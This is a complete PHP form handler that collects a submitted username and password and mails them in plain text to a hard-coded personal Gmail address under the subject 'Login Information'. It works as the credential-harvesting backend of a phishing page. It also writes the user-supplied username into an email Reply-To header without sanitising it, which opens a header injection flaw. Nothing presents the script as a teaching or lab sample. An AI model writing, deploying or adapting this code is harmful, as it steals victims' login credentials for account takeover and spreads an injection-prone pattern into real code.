<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  // Get the form data
  $username = $_POST['username'];
  $password = $_POST['password'];

  // Validate the form data
  if (empty($username) || empty($password)) {
    echo 'Please fill in all the fields.';
    exit;
  }

  // Construct the email body
  $emailBody = "Username: $username\nPassword: $password";

  // Set the email recipient
  $to = 'aanshsoodofficial102@gmail.com';

  // Set the email subject
  $subject = 'Login Information';

  // Set additional email headers
  $headers = "From: Your Website <noreply@yourwebsite.com>" . "\r\n";
  $headers .= "Reply-To: $username" . "\r\n";

  // Send the email
  if (mail($to, $subject, $emailBody, $headers)) {
    echo 'Login information sent successfully.';
  } else {
    echo 'Error sending login information. Please try again.';
  }
}
?>
